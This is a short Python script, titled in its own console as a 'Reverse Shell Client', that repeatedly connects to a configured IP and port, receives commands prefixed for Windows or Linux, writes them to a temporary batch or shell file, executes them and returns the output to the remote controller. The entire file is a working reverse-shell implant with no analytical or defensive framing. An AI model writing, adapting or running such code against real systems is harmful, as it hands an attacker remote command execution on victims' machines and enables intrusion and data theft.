import subprocess
import platform
import socket
import time
import os

ip = "127.0.0.1"
port = 65535
host = ip, int(port)


def clear():
    os.system("cls" if os.name == "nt" else "clear")


def set_console_title(title):
    if platform.system() == "Windows":
        import ctypes
        ctypes.windll.kernel32.SetConsoleTitleW(title)
    else:
        print(f"\033]0;{title}\007")


def connect():
    while True:
        try:
            client = socket.socket()
            client.connect(host)
            reverse_shell(client)

        except:
            time.sleep(5)


def reverse_shell(client):
    while True:
        data = client.recv(1024).decode()
        if data:
            if data.strip() == "exit":
                break
            output = execute_command(data)
            if output:
                client.sendall(output.encode())


def execute_command(command):
    if platform.system() == "Windows":
        if command.lower().startswith(":: windows") or command.lower().startswith("::windows"):
            bat_file = "command.bat"
            with open(bat_file, 'w') as file:
                file.write(f"@echo off\n{command}")
            output = subprocess.check_output(bat_file, shell=True, text=True)
            os.remove(bat_file)
            return output
    else:
        if command.lower().startswith("# linux") or command.lower().startswith("#linux"):
            sh_file = "command.sh"
            with open(sh_file, 'w') as file:
                file.write(f"#!/bin/bash\n{command}")
            os.chmod(sh_file, 0o755)
            output = subprocess.getoutput(f"./{sh_file}")
            os.remove(sh_file)
            return output


clear()
set_console_title("Reverse Shell Client")
connect()
